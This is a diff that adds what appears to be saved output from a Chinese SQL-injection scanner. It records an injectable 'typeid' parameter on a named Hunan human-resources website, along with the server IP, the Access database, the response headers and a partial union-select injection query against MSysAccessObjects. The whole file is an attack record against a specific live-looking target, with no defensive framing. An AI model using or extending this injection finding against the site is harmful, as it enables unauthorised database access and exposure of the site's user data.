@@ -1,0 +1,22 @@
+■漏洞信息:============================================================
+ ·URL:http://www.hnrlzysc.com/aboutus/webnewslist3.asp?typeid=16
+ ·页面标题：职业介绍机构-湖南人力资源网
+ ·参数:typeid=16
+ ·方法:GET
+ ·类型:Numeric
+ ·利用方法:And
+ ·脚本语言:asp
+ ·IP:222.240.173.82
+ ·数据库:Access
+ ·HEAD:
+HTTP/1.1 200 OK
+Cache-Control: private
+Content-Length: 22399
+Content-Type: text/html
+Server: Microsoft-IIS/7.0
+Date: Fri, 26 Aug 2011 07:17:09 GMT
+Connection: close
+
+
+联合查询列数: 总共= 0  显示的列= 0
+联合查询SQL: and 3=8 union select  from MSysAccessObjects
